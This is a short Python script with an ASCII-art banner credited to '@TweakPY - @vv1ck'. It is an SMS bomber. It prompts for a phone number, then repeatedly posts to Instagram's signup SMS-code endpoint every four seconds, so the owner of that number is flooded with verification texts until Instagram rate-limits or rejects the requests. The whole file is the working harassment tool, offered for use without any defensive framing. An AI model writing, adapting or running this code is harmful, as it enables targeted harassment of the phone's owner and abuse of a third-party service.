from requests import post;from time import sleep
def IGS():
	phone=input('[+] The Phone Number : ')
	while True:
		sleep(4)
		r=post('https://www.instagram.com/accounts/send_signup_sms_code_ajax/',headers={'HOST': "www.instagram.com",'KeepAlive': 'True','user-agent': 'Done','Cookie': 'missing','Accept': "*/*",'ContentType': "application/x-www-form-urlencoded","X-Requested-With": "XMLHttpRequest","X-IG-App-ID": "936619743392459","X-Instagram-AJAX": "missing","X-CSRFToken": "missing","Accept-Language": "en-US,en;q=0.9"},data={'client_id': "missing",'phone_number': phone,'phone_id': '','big_blue_token': ''}).text
		if 'Looks like your phone number may be incorrect.' in r:exit('[!] Check Your Phone Number')
		elif 'Please wait a few minutes before you try again.' in r:exit('[!] Ban For Min [3/10]')			
		elif 'true' in r:print( '[-] Done send sms')						
		else:exit('[!] Error ..')
print("""
██╗ ██████╗ ███████╗
██║██╔════╝ ██╔════╝
██║██║  ███╗███████╗
██║██║   ██║╚════██║
██║╚██████╔╝███████║
╚═╝ ╚═════╝ ╚══════╝
 
By @TweakPY - @vv1ck
""")
IGS()
